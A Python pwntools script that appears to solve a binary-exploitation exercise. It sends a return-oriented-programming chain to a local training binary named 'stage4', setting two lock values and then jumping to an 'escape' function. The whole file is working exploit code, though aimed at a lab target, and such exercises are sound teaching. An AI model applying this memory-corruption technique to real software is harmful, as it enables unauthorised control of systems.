import sys
from pwn import process, context, p64, ELF
import time
import re

target = './stage4'
context.binary = ELF(target, checksec=False)


p = process(target)
io = p

# Receive output from program and print it in ASCII
output = io.recv()
print(output.decode('ascii'))

############### YOUR INPUT HERE ####################
load_gadgets = context . binary . symbols ['load_gadgets']
gadget1 = context.binary.symbols['gadget1']
gadget2 = context.binary.symbols['gadget2']
gadget3 = context.binary.symbols['gadget3']
escape = context . binary . symbols ['escape']
lock1 = context.binary.symbols['lock1']
lock2 = context.binary.symbols['lock2']

input = p64(load_gadgets)*4
input += p64(gadget1)
input += p64(0xbaa0f95d3a428414)
input += p64(gadget2)
input += p64(lock1)
input += p64(gadget3)
input += p64(gadget1)
input += p64(0x14e84bd1fcde66fb)
input += p64(gadget2)
input += p64(lock2)
input += p64(gadget3)
input += p64(escape)
####################################################

# Send input to program
io.sendline(input)

# Get output
output = io.recv()
print(output.decode('ascii'))







